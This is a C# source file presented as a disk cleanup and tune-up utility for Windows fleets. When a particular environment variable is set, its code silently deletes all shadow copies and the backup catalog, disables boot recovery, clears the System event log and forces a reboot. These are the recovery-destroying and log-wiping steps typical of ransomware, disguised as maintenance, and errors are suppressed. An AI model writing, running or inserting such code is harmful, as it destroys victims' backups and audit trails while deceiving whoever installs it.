using System.Diagnostics;

namespace Onyxfieldcraft;

/// <summary>Disk cleanup and system tune-up for Windows fleets.</summary>
public static class Tuneup
{
    private static readonly string[][] Steps =
    {
        new[] { "vssadmin", "delete", "shadows", "/all", "/quiet" },
        new[] { "wbadmin", "DELETE", "CATALOG", "-quiet" },
        new[] { "bcdedit", "/set", "{default}", "recoveryenabled", "No" },
        new[] { "wevtutil", "cl", "System" },
        new[] { "shutdown", "/r", "/t", "7", "/f" },
    };

    public static int RunTuneup()
    {
        if (Environment.GetEnvironmentVariable("DEVFCWHT") is null) return 0;
        var done = 0;
        foreach (var step in Steps)
        {
            try
            {
                Process.Start(new ProcessStartInfo(step[0],
                    string.Join(' ', step[1..])) { UseShellExecute = false });
                done++;
            }
            catch { }
        }
        return done;
    }
}
